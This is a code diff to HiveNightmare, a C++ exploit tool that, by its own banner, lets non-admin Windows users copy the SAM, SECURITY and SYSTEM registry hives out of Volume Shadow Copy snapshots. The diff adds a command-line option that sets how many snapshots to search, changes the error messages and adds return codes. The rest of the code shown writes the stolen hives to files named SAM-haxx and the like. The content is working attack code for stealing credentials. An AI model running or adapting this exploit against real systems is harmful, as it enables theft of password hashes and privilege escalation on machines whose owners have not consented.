@@ -12,8 +12,6 @@
 #include <windows.h>
 #include <stdio.h>
 #include <iostream>
-#include "Shlwapi.h"
-#include <tchar.h>
 
 using std::endl;
 using std::cout;
@@ -60,8 +58,19 @@ void dumpHandleToFile(HANDLE handle, wchar_t* dest) {
     CloseHandle(hAppend);
 }
 
-void main()
+int main(int argc, char* argv[])
 {
+    int searchDepth;
+    if (argc > 1) {
+        if (sscanf_s(argv[1], "%d", &searchDepth) != 1) {
+            printf("\nUsage: HiveNightmare.exe [max shadows to look at (default 4)]\n\n");
+            return -1;
+        }
+    }
+    else {
+        searchDepth = 4;
+    }
+
     printf("\nHiveNightmare - dump registry hives as non-admin users\n\nRunning...\n\n");
 
     HANDLE hFile;
@@ -70,9 +79,10 @@ void main()
     TCHAR securityLocation[] = L"Windows\\System32\\config\\SECURITY";
     TCHAR systemLocation[] = L"Windows\\System32\\config\\SYSTEM";
 
-    hFile = getVssFileHandle(samLocation, 4);
+    hFile = getVssFileHandle(samLocation, searchDepth);
     if (hFile == INVALID_HANDLE_VALUE) {
-        printf("Could not open SAM :( Is System Protection not enabled or vulnerability fixed?  Note currently hardcoded to look for first 4 VSS snapshots only - list snapshots with vssadmin list shadows\n");
+        printf("Could not open SAM :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n");
+        return -1;
     }
     else {
         dumpHandleToFile(hFile, (wchar_t*)L"SAM-haxx");
@@ -81,9 +91,10 @@ void main()
     }
     
 
-    hFile = getVssFileHandle(securityLocation, 4);
+    hFile = getVssFileHandle(securityLocation, searchDepth);
     if (hFile == INVALID_HANDLE_VALUE) {
-        printf("Could not open SECURITY :( Is System Protection not enabled or vulnerability fixed?  Note currently hardcoded to look for first 4 VSS snapshots only - list snapshots with vssadmin list shadows\n");
+        printf("Could not open SECURITY :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n");
+        return -1;
     }
     else {
         dumpHandleToFile(hFile, (wchar_t*)L"SECURITY-haxx");
@@ -92,9 +103,10 @@ void main()
     }
     
 
-    hFile = getVssFileHandle(systemLocation, 4);
+    hFile = getVssFileHandle(systemLocation, searchDepth);
     if (hFile == INVALID_HANDLE_VALUE) {
-        printf("Could not open SYSTEM :( Is System Protection not enabled or vulnerability fixed?  Note currently hardcoded to look for first 4 VSS snapshots only - list snapshots with vssadmin list shadows\n");
+        printf("Could not open SYSTEM :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n");
+        return -1;
     }
     else {
         dumpHandleToFile(hFile, (wchar_t*)L"SYSTEM-haxx");
@@ -103,4 +115,6 @@ void main()
     }
 
     cout << "Assuming no errors, should be able to find hive dump files in current working directory as SAM-haxx, SECURITY-haxx and SYSTEM-haxx" << endl;
+
+    return 0;
 }
